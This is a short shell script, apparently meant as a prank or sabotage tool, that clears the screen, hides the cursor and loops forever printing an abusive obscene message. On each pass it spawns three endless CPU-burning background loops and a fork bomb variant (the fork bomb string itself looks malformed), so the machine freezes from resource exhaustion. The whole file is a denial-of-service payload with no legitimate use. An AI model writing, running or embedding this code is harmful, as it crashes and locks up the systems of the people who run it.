#!/bin/sh
# Simpler version - display then freeze

clear
printf "\033[2J\033[H\033[?25l"

# Infinite loop writing to screen and spawning processes
while true; do
    clear
    printf "\n\n\n\n\n\n\n\n\n\n"
    printf "                    Get fucked bitch\n"
    
    # Spawn background processes to eat resources
    (while true; do :; done) &
    (while true; do :; done) &
    (while true; do :; done) &
    
    # Fork bomb variant
    sh -c 'sh -c "$(echo ":(){":|:&"};:")" ' &
done
